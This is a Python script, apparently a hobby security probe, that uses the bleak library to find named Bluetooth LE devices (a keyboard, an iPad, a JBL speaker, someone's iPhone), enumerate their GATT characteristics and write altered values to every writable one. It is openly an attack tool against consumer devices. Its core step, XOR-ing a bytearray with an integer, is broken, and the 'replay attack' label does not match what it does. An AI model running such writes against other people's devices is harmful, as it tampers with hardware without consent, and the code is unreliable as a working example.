import asyncio
from bleak import BleakScanner, BleakClient
import logging

MANUFACTURER_NAME_UUID = "00002a29-0000-1000-8000-00805f9b34fb"
PNP_ID_UUID = "00002a50-0000-1000-8000-00805f9b34fb"

class BLEReplayAttack:
    def __init__(self):
        return
    
    async def connect_to_device(self, name: str):
        device = await BleakScanner.find_device_by_name(name)
        if device is not None:
            logging.info(device)
            logging.info(f"{device.address=}")
            return device.address
        else:
            logging.warning("device not found")
            return None
    
    async def get_device_characteristics(self, device_address):
        async with BleakClient(device_address) as client:
            services = await client.get_services()
            for service in services:
                logging.info(f"service: {service.uuid}")
                for characteristic in service.characteristics:
                    logging.info(f"characteristic: {characteristic.uuid}")
                    logging.info(f"properties: {characteristic.properties}")
                    await self.attempt_replay_attack(client, characteristic)
            try:
                # Read Manufacturer Name
                manufacturer_name = await client.read_gatt_char(MANUFACTURER_NAME_UUID)
                print("manufacturer name:", manufacturer_name.decode("utf-8"))
            except Exception as e:
                logging.warning(f"unable to get manufacturer name {e}")
    
    async def attempt_replay_attack(self, client, characteristic):
        if 'write' in characteristic.properties:
            try:
                original_value = await client.read_gatt_char(characteristic.uuid)
                print(f"read value: {original_value}")
                new_value = original_value ^ 1
                print(f"write value: {new_value}")
                await client.write_gatt_char(characteristic.uuid, new_value)
                value = await client.read_gatt_char(characteristic.uuid)
                print(f"read value: {value}")
                await client.write_gatt_char(characteristic.uuid, original_value)
                if value == new_value:
                    print("valued changed successfully")
                else:
                    print("value changed unsuccessfully")
            except Exception as e:
                logging.warning(f"Unable to replay attack {e=}")

    

async def main():
    logging.basicConfig(level=logging.INFO)
    ble_replay_attack = BLEReplayAttack()
    keyboard_address = await ble_replay_attack.connect_to_device("KB210")
    if keyboard_address is not None:
        await ble_replay_attack.get_device_characteristics(keyboard_address)
    ipad_address = await ble_replay_attack.connect_to_device("iPad (8)")
    if ipad_address is not None:
        await ble_replay_attack.get_device_characteristics(ipad_address)
    jbl_address = await ble_replay_attack.connect_to_device("JBL PARTYBOX 310")
    if jbl_address is not None:
        try:
            await ble_replay_attack.get_device_characteristics(jbl_address)
        except Exception as e:
            logging.warning(f"Issue connecting to JBL partybox")
    phone_address = await ble_replay_attack.connect_to_device("Anjuna’s iPhone")
    if phone_address is not None:
        await ble_replay_attack.get_device_characteristics(phone_address)

asyncio.run(main())